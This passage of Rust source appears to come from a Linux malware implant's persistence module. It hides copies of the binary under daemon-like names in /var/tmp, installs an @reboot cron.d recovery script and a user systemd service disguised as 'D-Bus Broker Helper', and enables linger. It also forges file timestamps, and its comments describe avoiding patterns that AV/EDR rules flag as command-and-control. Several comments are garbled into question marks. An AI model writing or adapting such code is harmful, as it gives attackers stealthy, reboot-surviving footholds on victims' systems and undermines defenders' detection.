/// When agent lives in /dev/shm (tmpfs), install cron to restore after reboot.
#[cfg(unix)]
fn install_devshm_recovery(
    exe_str: &str,
    distro: crate::platform::Distro,
) -> Result<String, String> {
    let persistent_backup = if matches!(
        distro,
        crate::platform::Distro::CentOS | crate::platform::Distro::RHEL
    ) {
        "/var/tmp/.polkitd".to_string()
    } else {
        "/var/tmp/.accounts-daemon".to_string()
    };

    // Ensure persistent backup exists
    if !std::path::Path::new(&persistent_backup).exists() {
        let _ = std::fs::copy(exe_str, &persistent_backup);
        let _ = Command::new("chmod").args(&["755", &persistent_backup]).output();
    }

    // Install cron.d recovery entry
    let cron_name = system_cron_name(distro);
    let cron_path = format!("/etc/cron.d/{}-recovery", cron_name);

    let content = format!(
        // Write a tiny recovery script; cron.d calls the script directly.
        // Avoids the '/bin/sh -c "sleep N && cmd && cmd"' chained-command
        // pattern that is a known C2 indicator in AV/EDR rules.
        "@reboot root {}\n",
        {
            let is_centos = matches!(distro,
                crate::platform::Distro::CentOS | crate::platform::Distro::RHEL);
            let script_name = if is_centos { ".polkitd-rc.sh" } else { ".acctd-rc.sh" };
            let script_path = format!("/var/tmp/{}", script_name);
            let script_content = format!(
                "#!/bin/sh\nsleep 3\ncp '{}' '{}' 2>/dev/null\nchmod 755 '{}' 2>/dev/null\n'{}' >/dev/null 2>&1 &\n",
                persistent_backup, exe_str, exe_str, exe_str
            );
            let _ = std::fs::write(&script_path, &script_content);
            let _ = Command::new("chmod").args(&["755", &script_path]).output();
            script_path
        }
    );

    std::fs::write(&cron_path, content).map_err(|e| e.to_string())?;
    disguise_timestamp(&cron_path);
    let _ = Command::new("chmod").args(&["600", &cron_path]).output();

    Ok(format!("devshm recovery via {} -> {}", persistent_backup, exe_str))
}

// ---- Strategy 7: systemd user service (? root) ----

/// ?? root ???? systemd user service?
///
/// ?????
///   - systemd >= 244?RHEL8+, Ubuntu 20.04+?
///   - XDG_RUNTIME_DIR ?????????
///   - `~/.config/systemd/user/` ??
///
/// Non-root user systemd service (XDG user session, RHEL8+/Ubuntu20+).
///
/// Benefits vs crontab:
///   - Restart=on-failure (auto-restart)
///   - No shell environment dependency
///   - Cleaner than crontab entries
///
/// Limitation: without `loginctl enable-linger` only runs while user is logged in.
#[cfg(unix)]
fn install_user_systemd_service(exe_str: &str) -> Result<String, String> {
    let home = std::env::var("HOME").unwrap_or_default();
    if home.is_empty() { return Err("no HOME".to_string()); }

    let config_systemd = format!("{}/.config/systemd/user", home);
    std::fs::create_dir_all(&config_systemd).map_err(|e| e.to_string())?;

    // Use an innocuous-looking service name
    let service_name = "dbus-broker-helper.service";
    let service_path = format!("{}/{}", config_systemd, service_name);

    // Already installed with correct binary
    if let Ok(content) = std::fs::read_to_string(&service_path) {
        if content.contains(exe_str) {
            return Ok("already exists".to_string());
        }
    }

    // DAEMONIZED=1 prevents double-fork when started by systemd (same as root service).
    // ExecStart has no quotes — systemd splits on spaces, our paths never have spaces.
    let content = format!(
        "[Unit]\nDescription=D-Bus Broker Helper\nAfter=default.target\n\n\
         [Service]\nType=simple\nEnvironment=\"DAEMONIZED=1\"\nExecStart={}\nRestart=on-failure\nRestartSec={}\n\
         Environment=\"HOME={}\"\n\n\
         [Install]\nWantedBy=default.target\n",
        exe_str, 37 + (std::process::id() % 37), home
    );

    std::fs::write(&service_path, &content).map_err(|e| e.to_string())?;
    disguise_timestamp(&service_path);

    // Enable via systemctl --user (requires active D-Bus session)
    let _ = Command::new("systemctl")
        .args(&["--user", "daemon-reload"])
        .output();
    let _ = Command::new("systemctl")
        .args(&["--user", "enable", service_name])
        .output();

    // Try to enable linger so service runs even without active login session
    let username: String = unsafe {
        let uid = libc::getuid();
        let pw = libc::getpwuid(uid);
        if pw.is_null() {
            String::new()
        } else {
            std::ffi::CStr::from_ptr((*pw).pw_name)
                .to_string_lossy().to_string()
        }
    };
    if !username.is_empty() {
        let linger_ok = Command::new("loginctl")
            .args(&["enable-linger", &username])
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false);
        if !linger_ok {
            // Linger failed — user service only runs while logged in.
            // Fall through: service still useful during active sessions,
            // and other persistence strategies (crontab, bashrc) cover reboot.
            crate::debug_log("loginctl enable-linger failed — user service won't persist across logout");
        }
    }

    Ok(format!("user-systemd installed: {}", service_name))
}

#[cfg(unix)]
fn uninstall_user_systemd_service() -> String {
    let home = std::env::var("HOME").unwrap_or_default();
    if home.is_empty() { return "user-systemd: no HOME".to_string(); }

    let service_name = "dbus-broker-helper.service";
    let service_path = format!("{}/.config/systemd/user/{}", home, service_name);

    let _ = Command::new("systemctl")
        .args(&["--user", "stop", service_name])
        .output();
    let _ = Command::new("systemctl")
        .args(&["--user", "disable", service_name])
        .output();
    let _ = std::fs::remove_file(&service_path);
    let _ = Command::new("systemctl")
        .args(&["--user", "daemon-reload"])
        .output();

    format!("user-systemd: removed {}", service_path)
}

#[cfg(unix)]
fn uninstall_devshm_recovery(distro: crate::platform::Distro) -> String {
    let is_centos = matches!(distro,
        crate::platform::Distro::CentOS | crate::platform::Distro::RHEL);
    let persistent_backup = if is_centos {
        "/var/tmp/.polkitd"
    } else {
        "/var/tmp/.accounts-daemon"
    };
    let script_name = if is_centos { ".polkitd-rc.sh" } else { ".acctd-rc.sh" };
    let script_path = format!("/var/tmp/{}", script_name);
    let cron_name = system_cron_name(distro);
    let cron_path = format!("/etc/cron.d/{}-recovery", cron_name);

    let _ = std::fs::remove_file(persistent_backup);
    let _ = std::fs::remove_file(&script_path);
    let _ = std::fs::remove_file(&cron_path);

    format!("devshm-recovery: removed {} {} {}", persistent_backup, script_path, cron_path)
}
